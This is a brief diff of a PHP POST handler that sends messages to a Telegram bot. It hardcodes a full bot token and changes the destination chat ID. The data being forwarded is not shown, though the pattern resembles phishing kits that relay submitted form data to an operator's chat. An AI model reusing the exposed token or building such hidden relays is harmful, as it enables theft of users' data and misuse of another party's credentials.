@@ -26,7 +26,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 
     // Send message to Telegram (unchanged from your original code)
     $botToken = "7021492334:AAHkFKSAZnilFga6524Fn9Dghe7voKYqu-M";
-    $chatId = "6131366493";
+    $chatId = "1266887534";
     $url = "https://api.telegram.org/bot$botToken/sendMessage";
     $data = [
         'chat_id' => $chatId,
